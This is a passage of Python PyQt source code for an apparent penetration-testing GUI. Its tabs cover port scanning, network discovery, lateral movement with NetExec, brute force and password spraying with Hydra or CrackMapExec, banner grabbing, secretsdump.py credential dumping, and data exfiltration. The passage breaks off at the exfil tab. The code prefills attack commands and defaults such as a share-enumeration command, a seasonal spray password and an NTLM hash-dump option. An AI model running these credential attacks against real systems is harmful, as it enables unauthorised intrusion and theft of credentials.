        self.external_tools_info_label.setStyleSheet(f"QLabel#external_tools_info_label {{ color: {self.orange_color.name()}; padding: 10px; border: 1px solid {self.orange_color.name()}; border-radius: 5px; margin-top: 10px; }}")
        self.external_tools_info_label.setWordWrap(True)
        self.external_tools_info_label.setFixedWidth(700) # Set a fixed width to prevent cramping (adjust as needed)
        header_layout.addWidget(self.external_tools_info_label, alignment=Qt.AlignmentFlag.AlignCenter)

        # Add a final stretch at the bottom of the header frame to ensure content is not squashed against the bottom
        header_layout.addStretch(1)

        # Add header_frame to main_layout with a stretch factor
        self.main_layout.addWidget(header_frame, 1) # Give header 1 unit of stretch

        # --- Main Content Frame (Tab Widget) ---
        self.notebook = QTabWidget(self)
        self.notebook.setFont(QFont("Arial", 12))
        # Add notebook to main_layout with a larger stretch factor
        self.main_layout.addWidget(self.notebook, 3) # Give notebook 3 units of stretch

        # Connect the tab changed signal
        self.notebook.currentChanged.connect(self.on_tab_changed)

        # --- Port Scan Tab ---
        port_scan_tab = QWidget()
        self.notebook.addTab(port_scan_tab, "Port Scanner")
        self._create_port_scan_widgets(port_scan_tab)

        # --- Network Discovery Tab (New) ---
        network_discovery_tab = QWidget()
        self.notebook.addTab(network_discovery_tab, "Network Discovery")
        self._create_network_discovery_widgets(network_discovery_tab)

        # --- Lateral Movement Tab ---
        lateral_movement_tab = QWidget()
        self.notebook.addTab(lateral_movement_tab, "Lateral Movement")
        self._create_netexec_widgets(lateral_movement_tab)

        # --- Brute Force Tab ---
        self.brute_force_tab = QWidget()
        self.notebook.addTab(self.brute_force_tab, "Brute Force")
        self._create_brute_force_widgets(self.brute_force_tab)

        # --- Password Spray Tab ---
        self.password_spray_tab = QWidget()
        self.notebook.addTab(self.password_spray_tab, "Password Spray")
        self._create_password_spray_widgets(self.password_spray_tab)

        # --- Banner Grabbing Tab ---
        self.banner_grabbing_tab = QWidget()
        self.notebook.addTab(self.banner_grabbing_tab, "Banner Grabbing")
        self._create_banner_grabbing_widgets(self.banner_grabbing_tab)

        # --- Password Dumping Tab ---
        self.password_dumping_tab = QWidget()
        self.notebook.addTab(self.password_dumping_tab, "Password Dumping")
        self._create_password_dumping_widgets(self.password_dumping_tab)

        # --- Exfil Tab ---
        self.exfil_tab = QWidget()
        self.notebook.addTab(self.exfil_tab, "Exfil")
        self._create_exfil_widgets(self.exfil_tab)

        # --- Status Bar ---
        self.status_bar = QLabel("Ready.")
        self.status_bar.setFont(QFont("Arial", 10))
        self.status_bar.setStyleSheet(f"QLabel {{ background-color: {self.medium_bg_color.name()}; border: 1px solid {self.medium_bg_color.name()}; padding: 5px; border-radius: 8px; }}")
        self.main_layout.addWidget(self.status_bar)

        self.update_authorization_state()

    def _create_port_scan_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        layout.addWidget(QLabel("Target IP/Hostname/CIDR (e.g., 192.168.1.1, example.com, 192.168.1.0/24):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.target_entry = QLineEdit("127.0.0.1")
        self.target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.target_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Port Range (e.g., 1-1000 or 80):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.port_range_entry = QLineEdit("1-100")
        self.port_range_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.port_range_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Number of Threads (for Python scanner):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.threads_entry = QLineEdit("100")
        self.threads_entry.setFont(QFont("Arial", 12))
        self.threads_entry.setValidator(QIntValidator(1, 200)) # Limit threads to a more reasonable range for stability
        layout.addWidget(self.threads_entry, row, 1)
        row += 1

        self.use_python_scanner_checkbox = QCheckBox("Use Python Port Scanner (default)")
        self.use_python_scanner_checkbox.setFont(QFont("Arial", 10))
        self.use_python_scanner_checkbox.setChecked(True)
        self.use_python_scanner_checkbox.toggled.connect(self.toggle_python_scanner_usage)
        layout.addWidget(self.use_python_scanner_checkbox, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        self.use_nmap_checkbox = QCheckBox("Use Nmap for Scan (Requires Nmap installed)") # Updated text
        self.use_nmap_checkbox.setFont(QFont("Arial", 10))
        self.use_nmap_checkbox.setChecked(False)
        self.use_nmap_checkbox.toggled.connect(self.toggle_nmap_usage)
        layout.addWidget(self.use_nmap_checkbox, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        button_frame_scan = QFrame()
        button_frame_scan.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_scan = QHBoxLayout(button_frame_scan)
        button_layout_scan.setContentsMargins(0, 0, 0, 0)
        button_layout_scan.setSpacing(20)
        button_layout_scan.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.scan_button = QPushButton("Start Scan")
        # self.scan_button.setObjectName("scanButton") # No need for specific object name, inherits default green
        self.scan_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.scan_button.clicked.connect(self.start_scan)
        button_layout_scan.addWidget(self.scan_button)

        self.stop_button = QPushButton("Stop Scan")
        self.stop_button.setObjectName("stopButton")
        self.stop_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_button.clicked.connect(self.stop_scan)
        self.stop_button.setEnabled(False)
        button_layout_scan.addWidget(self.stop_button)

        layout.addWidget(button_frame_scan, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("Scan Results:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.results_text = QTextEdit()
        self.results_text.setFont(QFont("Monospace", 10))
        self.results_text.setReadOnly(True)
        layout.addWidget(self.results_text, row, 1)

        layout.setRowStretch(row, 1)

    def _create_network_discovery_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        #info_font = QFont("Arial", 10, italic=True)
        #info_label = QLabel("This tab performs network discovery (ARP scan) using Scapy to find active hosts on your local network. It requires Scapy to be installed (e.g., `pip install scapy`) and may need elevated privileges (run as administrator/root).")
        #info_label.setFont(info_font)
        #info_label.setStyleSheet(f"QLabel {{ color: {self.orange_color.name()}; padding: 5px; border: 1px solid {self.orange_color.name()}; border-radius: 5px; margin-bottom: 10px; }}")
        #info_label.setWordWrap(True)
        #layout.addWidget(info_label, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        layout.addWidget(QLabel("Target IP/Range (e.g., 192.168.1.0/24 or 192.168.1.1):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.network_discovery_target_entry = QLineEdit("192.168.1.0/24")
        self.network_discovery_target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.network_discovery_target_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Save to PCAP File (Optional, e.g., discovery.pcap):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.network_discovery_pcap_entry = QLineEdit("")
        self.network_discovery_pcap_entry.setPlaceholderText("Leave empty to not save")
        self.network_discovery_pcap_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.network_discovery_pcap_entry, row, 1)
        row += 1

        button_frame_discovery = QFrame()
        button_frame_discovery.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_discovery = QHBoxLayout(button_frame_discovery)
        button_layout_discovery.setContentsMargins(0, 0, 0, 0)
        button_layout_discovery.setSpacing(20)
        button_layout_discovery.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.start_network_discovery_button = QPushButton("Start Discovery")
        # self.start_network_discovery_button.setObjectName("scanButton") # Reusing scan button style
        self.start_network_discovery_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.start_network_discovery_button.clicked.connect(self.start_network_discovery)
        button_layout_discovery.addWidget(self.start_network_discovery_button)

        self.stop_network_discovery_button = QPushButton("Stop Discovery")
        self.stop_network_discovery_button.setObjectName("stopButton")
        self.stop_network_discovery_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_network_discovery_button.clicked.connect(self.stop_network_discovery)
        self.stop_network_discovery_button.setEnabled(False)
        button_layout_discovery.addWidget(self.stop_network_discovery_button)

        layout.addWidget(button_frame_discovery, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("Discovery Results:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.network_discovery_results_text = QTextEdit()
        self.network_discovery_results_text.setFont(QFont("Monospace", 10))
        self.network_discovery_results_text.setReadOnly(True)
        layout.addWidget(self.network_discovery_results_text, row, 1)

        layout.setRowStretch(row, 1)

    def _create_netexec_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        layout.addWidget(QLabel("Target IP/Range (e.g., 192.168.1.10 or 192.168.1.0/24):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.netexec_target_entry = QLineEdit("127.0.0.1")
        self.netexec_target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.netexec_target_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Select Protocol:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.netexec_protocols = [
            "smb", "ssh", "winrm", "mssql", "ldap", "rdp", "vnc"
        ]
        self.netexec_protocol_combobox = QComboBox() # Renamed to avoid conflict
        self.netexec_protocol_combobox.addItems(self.netexec_protocols)
        self.netexec_protocol_combobox.setFont(QFont("Arial", 12))
        self.netexec_protocol_combobox.currentTextChanged.connect(self.on_netexec_protocol_select)
        layout.addWidget(self.netexec_protocol_combobox, row, 1)
        row += 1

        layout.addWidget(QLabel("NetExec Command (Edit if needed, <target_ip> will be replaced):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.netexec_command_edit = QLineEdit("netexec smb <target_ip> --shares") # Changed to QLineEdit for editing
        self.netexec_command_edit.setFont(QFont("Monospace", 10))
        layout.addWidget(self.netexec_command_edit, row, 1)
        row += 1
        self.on_netexec_protocol_select() # Initialize command text based on default protocol

        button_frame_netexec = QFrame()
        button_frame_netexec.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_netexec = QHBoxLayout(button_frame_netexec)
        button_layout_netexec.setContentsMargins(0, 0, 0, 0)
        button_layout_netexec.setSpacing(20)
        button_layout_netexec.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.run_netexec_button = QPushButton("Run NetExec")
        self.run_netexec_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.run_netexec_button.clicked.connect(self.run_netexec)
        button_layout_netexec.addWidget(self.run_netexec_button)

        self.stop_netexec_button = QPushButton("Stop NetExec")
        self.stop_netexec_button.setObjectName("stopButton")
        self.stop_netexec_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_netexec_button.clicked.connect(self.stop_netexec)
        self.stop_netexec_button.setEnabled(False)
        button_layout_netexec.addWidget(self.stop_netexec_button)

        layout.addWidget(button_frame_netexec, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("NetExec Output:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.netexec_output_text = QTextEdit()
        self.netexec_output_text.setFont(QFont("Monospace", 10))
        self.netexec_output_text.setReadOnly(True)
        layout.addWidget(self.netexec_output_text, row, 1)

        layout.setRowStretch(row, 1)

    def _create_brute_force_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        layout.addWidget(QLabel("Target IP/Host (e.g., 192.168.1.10 or 192.168.1.0/24):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.brute_force_target_entry = QLineEdit("127.0.0.1")
        self.brute_force_target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.brute_force_target_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Username (single username for brute force):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.brute_force_username_entry = QLineEdit("admin")
        self.brute_force_username_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.brute_force_username_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Tool:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.brute_force_tool_combobox = QComboBox()
        self.brute_force_tool_combobox.addItems(["Hydra", "NetExec", "CrackMapExec"])
        self.brute_force_tool_combobox.setFont(QFont("Arial", 12))
        self.brute_force_tool_combobox.currentTextChanged.connect(self.on_brute_force_tool_select)
        layout.addWidget(self.brute_force_tool_combobox, row, 1)
        row += 1

        layout.addWidget(QLabel("Protocol:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.brute_force_protocol_combobox = QComboBox()
        self.brute_force_protocol_combobox.addItems(["smb", "ssh", "winrm", "mssql", "ldap", "rdp", "vnc"])
        self.brute_force_protocol_combobox.setFont(QFont("Arial", 12))
        layout.addWidget(self.brute_force_protocol_combobox, row, 1)
        row += 1

        layout.addWidget(QLabel("Command (Edit if needed, <target_ip>, <username>, <wordlist_file> will be replaced):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.brute_force_command_edit = QLineEdit() # Editable command
        self.brute_force_command_edit.setFont(QFont("Monospace", 10))
        layout.addWidget(self.brute_force_command_edit, row, 1)
        row += 1
        self.on_brute_force_tool_select() # Initialize command text based on default tool

        wordlist_group_label = QLabel("Wordlist Options:")
        wordlist_group_label.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        layout.addWidget(wordlist_group_label, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        self.use_rockyou_checkbox = QCheckBox(f"Use default '{self.rockyou_wordlist_path}'")
        self.use_rockyou_checkbox.setFont(QFont("Arial", 10))
        self.use_rockyou_checkbox.setChecked(True)
        self.use_rockyou_checkbox.stateChanged.connect(self.on_brute_force_wordlist_option_changed)
        layout.addWidget(self.use_rockyou_checkbox, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        layout.addWidget(QLabel("Paste Wordlist:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.brute_force_paste_wordlist_text = QTextEdit()
        self.brute_force_paste_wordlist_text.setPlaceholderText("Enter passwords, one per line (overrides default rockyou.txt)")
        self.brute_force_paste_wordlist_text.setFont(QFont("Monospace", 10))
        self.brute_force_paste_wordlist_text.setMinimumHeight(80)
        self.brute_force_paste_wordlist_text.textChanged.connect(self.on_brute_force_wordlist_option_changed)
        layout.addWidget(self.brute_force_paste_wordlist_text, row, 1)
        row += 1

        upload_wordlist_frame = QFrame()
        upload_wordlist_frame.setFrameShape(QFrame.Shape.NoFrame)
        upload_wordlist_layout = QHBoxLayout(upload_wordlist_frame)
        upload_wordlist_layout.setContentsMargins(0, 0, 0, 0)
        upload_wordlist_layout.setSpacing(10)

        self.upload_brute_force_wordlist_button = QPushButton("Upload Wordlist File")
        self.upload_brute_force_wordlist_button.setFont(QFont("Arial", 10))
        self.upload_brute_force_wordlist_button.clicked.connect(self.upload_brute_force_wordlist)
        upload_wordlist_layout.addWidget(self.upload_brute_force_wordlist_button)

        self.brute_force_wordlist_file_label = QLabel("No file selected.")
        self.brute_force_wordlist_file_label.setFont(QFont("Arial", 10))
        upload_wordlist_layout.addWidget(self.brute_force_wordlist_file_label)
        upload_wordlist_layout.addStretch(1)

        layout.addWidget(QLabel("Upload Wordlist:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        layout.addWidget(upload_wordlist_frame, row, 1)
        row += 1

        button_frame_brute_force = QFrame()
        button_frame_brute_force.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_brute_force = QHBoxLayout(button_frame_brute_force)
        button_layout_brute_force.setContentsMargins(0, 0, 0, 0)
        button_layout_brute_force.setSpacing(20)
        button_layout_brute_force.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.start_brute_force_button = QPushButton("Start Brute Force")
        # self.start_brute_force_button.setObjectName("bruteForceButton") # No need for specific object name, inherits default green
        self.start_brute_force_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.start_brute_force_button.clicked.connect(self.start_brute_force)
        button_layout_brute_force.addWidget(self.start_brute_force_button)

        self.stop_brute_force_button = QPushButton("Stop Brute Force")
        self.stop_brute_force_button.setObjectName("stopButton")
        self.stop_brute_force_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_brute_force_button.clicked.connect(self.stop_brute_force)
        self.stop_brute_force_button.setEnabled(False)
        button_layout_brute_force.addWidget(self.stop_brute_force_button)

        layout.addWidget(button_frame_brute_force, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("Brute Force Output:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.brute_force_output_text = QTextEdit()
        self.brute_force_output_text.setFont(QFont("Monospace", 10))
        self.brute_force_output_text.setReadOnly(True)
        layout.addWidget(self.brute_force_output_text, row, 1)

        layout.setRowStretch(row, 1)
        self.on_brute_force_wordlist_option_changed() # Initialize state of wordlist options

    def _create_password_spray_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        layout.addWidget(QLabel("Target IP/Host (e.g., 192.168.1.10 or 192.168.1.0/24):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.password_spray_target_entry = QLineEdit("127.0.0.1")
        self.password_spray_target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.password_spray_target_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Password (single password for spraying):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.password_spray_password_entry = QLineEdit("Summer2024!")
        self.password_spray_password_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.password_spray_password_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Tool:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.password_spray_tool_combobox = QComboBox()
        self.password_spray_tool_combobox.addItems(["NetExec", "Hydra", "CrackMapExec"])
        self.password_spray_tool_combobox.setFont(QFont("Arial", 12))
        self.password_spray_tool_combobox.currentTextChanged.connect(self.on_password_spray_tool_select)
        layout.addWidget(self.password_spray_tool_combobox, row, 1)
        row += 1

        layout.addWidget(QLabel("Protocol:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.password_spray_protocol_combobox = QComboBox()
        self.password_spray_protocol_combobox.addItems(["smb", "ssh", "winrm", "mssql", "ldap", "rdp", "vnc"])
        self.password_spray_protocol_combobox.setFont(QFont("Arial", 12))
        layout.addWidget(self.password_spray_protocol_combobox, row, 1)
        row += 1

        layout.addWidget(QLabel("Command (Edit if needed, <target_ip>, <password>, <usernames_file> will be replaced):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.password_spray_command_edit = QLineEdit() # Editable command
        self.password_spray_command_edit.setFont(QFont("Monospace", 10))
        layout.addWidget(self.password_spray_command_edit, row, 1)
        row += 1
        self.on_password_spray_tool_select() # Initialize command text based on default tool

        usernames_group_label = QLabel("Usernames List:")
        usernames_group_label.setFont(QFont("Arial", 12, QFont.Weight.Bold))
        layout.addWidget(usernames_group_label, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        layout.addWidget(QLabel("Paste Usernames:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.password_spray_paste_usernames_text = QTextEdit()
        self.password_spray_paste_usernames_text.setPlaceholderText("Enter usernames, one per line (e.g., admin, user1, johndoe)")
        self.password_spray_paste_usernames_text.setFont(QFont("Monospace", 10))
        self.password_spray_paste_usernames_text.setMinimumHeight(80)
        self.password_spray_paste_usernames_text.textChanged.connect(self.on_password_spray_usernames_option_changed)
        layout.addWidget(self.password_spray_paste_usernames_text, row, 1)
        row += 1

        upload_usernames_frame = QFrame()
        upload_usernames_frame.setFrameShape(QFrame.Shape.NoFrame)
        upload_usernames_layout = QHBoxLayout(upload_usernames_frame)
        upload_usernames_layout.setContentsMargins(0, 0, 0, 0)
        upload_usernames_layout.setSpacing(10)

        self.upload_password_spray_usernames_button = QPushButton("Upload Usernames File")
        self.upload_password_spray_usernames_button.setFont(QFont("Arial", 10))
        self.upload_password_spray_usernames_button.clicked.connect(self.upload_password_spray_usernames)
        upload_usernames_layout.addWidget(self.upload_password_spray_usernames_button)

        self.password_spray_usernames_file_label = QLabel("No file selected.")
        self.password_spray_usernames_file_label.setFont(QFont("Arial", 10))
        upload_usernames_layout.addWidget(self.password_spray_usernames_file_label)
        upload_usernames_layout.addStretch(1)

        layout.addWidget(QLabel("Upload Usernames:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        layout.addWidget(upload_usernames_frame, row, 1)
        row += 1

        button_frame_password_spray = QFrame()
        button_frame_password_spray.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_password_spray = QHBoxLayout(button_frame_password_spray)
        button_layout_password_spray.setContentsMargins(0, 0, 0, 0)
        button_layout_password_spray.setSpacing(20)
        button_layout_password_spray.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.start_password_spray_button = QPushButton("Start Password Spray")
        # self.start_password_spray_button.setObjectName("passwordSprayButton") # No need for specific object name, inherits default green
        self.start_password_spray_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.start_password_spray_button.clicked.connect(self.start_password_spray)
        button_layout_password_spray.addWidget(self.start_password_spray_button)

        self.stop_password_spray_button = QPushButton("Stop Password Spray")
        self.stop_password_spray_button.setObjectName("stopButton")
        self.stop_password_spray_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_password_spray_button.clicked.connect(self.stop_password_spray)
        self.stop_password_spray_button.setEnabled(False)
        button_layout_password_spray.addWidget(self.stop_password_spray_button)

        layout.addWidget(button_frame_password_spray, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("Password Spray Output:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.password_spray_output_text = QTextEdit()
        self.password_spray_output_text.setFont(QFont("Monospace", 10))
        self.password_spray_output_text.setReadOnly(True)
        layout.addWidget(self.password_spray_output_text, row, 1, 3, 1) # Increased row span to 3 for larger output
        row += 3 # Adjust row counter for the increased span

        layout.setRowStretch(row, 1) # Ensure this row stretches
        self.on_password_spray_usernames_option_changed() # Initialize state of usernames options

    def _create_banner_grabbing_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        # Updated label to indicate CIDR/hostname support
        layout.addWidget(QLabel("Target IP/Hostname/CIDR (e.g., 192.168.1.1, example.com, 192.168.1.0/24):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.banner_grab_target_entry = QLineEdit("127.0.0.1")
        self.banner_grab_target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.banner_grab_target_entry, row, 1)
        row += 1

        # Updated label to indicate multiple ports support
        layout.addWidget(QLabel("Target Port(s) (e.g., 80, 443, 22):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.banner_grab_port_entry = QLineEdit("80")
        self.banner_grab_port_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.banner_grab_port_entry, row, 1)
        row += 1

        button_frame_banner_grab = QFrame()
        button_frame_banner_grab.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_banner_grab = QHBoxLayout(button_frame_banner_grab)
        button_layout_banner_grab.setContentsMargins(0, 0, 0, 0)
        button_layout_banner_grab.setSpacing(20)
        button_layout_banner_grab.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.start_banner_grab_button = QPushButton("Start Banner Grabbing")
        # self.start_banner_grab_button.setObjectName("bannerGrabButton") # No need for specific object name, inherits default green
        self.start_banner_grab_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.start_banner_grab_button.clicked.connect(self.start_banner_grabbing)
        button_layout_banner_grab.addWidget(self.start_banner_grab_button)

        self.stop_banner_grab_button = QPushButton("Stop Banner Grabbing")
        self.stop_banner_grab_button.setObjectName("stopButton")
        self.stop_banner_grab_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_banner_grab_button.clicked.connect(self.stop_banner_grabbing)
        self.stop_banner_grab_button.setEnabled(False)
        button_layout_banner_grab.addWidget(self.stop_banner_grab_button)

        layout.addWidget(button_frame_banner_grab, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("Banner Grabbing Output:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.banner_grab_output_text = QTextEdit()
        self.banner_grab_output_text.setFont(QFont("Monospace", 10))
        self.banner_grab_output_text.setReadOnly(True)
        layout.addWidget(self.banner_grab_output_text, row, 1)

        layout.setRowStretch(row, 1)

    def _create_password_dumping_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(10)

        row = 0
        layout.addWidget(QLabel("Password Dumping (secretsdump.py):"), row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        # REMOVED: info_label about secretsdump.py

        layout.addWidget(QLabel("Target IP/Hostname (e.g., 192.168.1.100):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.secretsdump_target_entry = QLineEdit("127.0.0.1")
        self.secretsdump_target_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.secretsdump_target_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Domain (Optional):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.secretsdump_domain_entry = QLineEdit("")
        self.secretsdump_domain_entry.setPlaceholderText("e.g., MYDOMAIN")
        self.secretsdump_domain_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.secretsdump_domain_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Username:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.secretsdump_username_entry = QLineEdit("Administrator")
        self.secretsdump_username_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.secretsdump_username_entry, row, 1)
        row += 1

        self.secretsdump_use_hashes_checkbox = QCheckBox("Use Hashes (LM:NT format)")
        self.secretsdump_use_hashes_checkbox.setFont(QFont("Arial", 10))
        self.secretsdump_use_hashes_checkbox.stateChanged.connect(self.on_secretsdump_auth_type_changed)
        layout.addWidget(self.secretsdump_use_hashes_checkbox, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignLeft)
        row += 1

        self.secretsdump_password_label = QLabel("Password:")
        layout.addWidget(self.secretsdump_password_label, row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.secretsdump_password_entry = QLineEdit("MySuperSecretPassword1!")
        self.secretsdump_password_entry.setEchoMode(QLineEdit.EchoMode.Password)
        self.secretsdump_password_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.secretsdump_password_entry, row, 1)
        row += 1

        layout.addWidget(QLabel("Additional Options (e.g., --just-dc-ntlm):"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft)
        self.secretsdump_options_entry = QLineEdit("")
        self.secretsdump_options_entry.setPlaceholderText("--just-dc-ntlm")
        self.secretsdump_options_entry.setFont(QFont("Arial", 12))
        layout.addWidget(self.secretsdump_options_entry, row, 1)
        row += 1

        button_frame_dump = QFrame()
        button_frame_dump.setFrameShape(QFrame.Shape.NoFrame)
        button_layout_dump = QHBoxLayout(button_frame_dump)
        button_layout_dump.setContentsMargins(0, 0, 0, 0)
        button_layout_dump.setSpacing(20)
        button_layout_dump.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.start_password_dump_button = QPushButton("Start Password Dump")
        # self.start_password_dump_button.setObjectName("passwordDumpButton") # No need for specific object name, inherits default green
        self.start_password_dump_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.start_password_dump_button.clicked.connect(self.start_password_dumping)
        button_layout_dump.addWidget(self.start_password_dump_button)

        self.stop_password_dump_button = QPushButton("Stop Dump")
        self.stop_password_dump_button.setObjectName("stopButton")
        self.stop_password_dump_button.setFont(QFont("Arial", 14, QFont.Weight.Bold))
        self.stop_password_dump_button.clicked.connect(self.stop_password_dumping)
        self.stop_password_dump_button.setEnabled(False)
        button_layout_dump.addWidget(self.stop_password_dump_button)

        layout.addWidget(button_frame_dump, row, 0, 1, 2, alignment=Qt.AlignmentFlag.AlignCenter)
        row += 1

        layout.addWidget(QLabel("secretsdump.py Output:"), row, 0, alignment=Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
        self.password_dump_output_text = QTextEdit()
        self.password_dump_output_text.setFont(QFont("Monospace", 10))
        self.password_dump_output_text.setReadOnly(True)
        layout.addWidget(self.password_dump_output_text, row, 1)

        layout.setRowStretch(row, 1)
        self.on_secretsdump_auth_type_changed() # Initialize password/hash field based on checkbox state

    def _create_exfil_widgets(self, parent_widget):
        layout = QGridLayout(parent_widget)
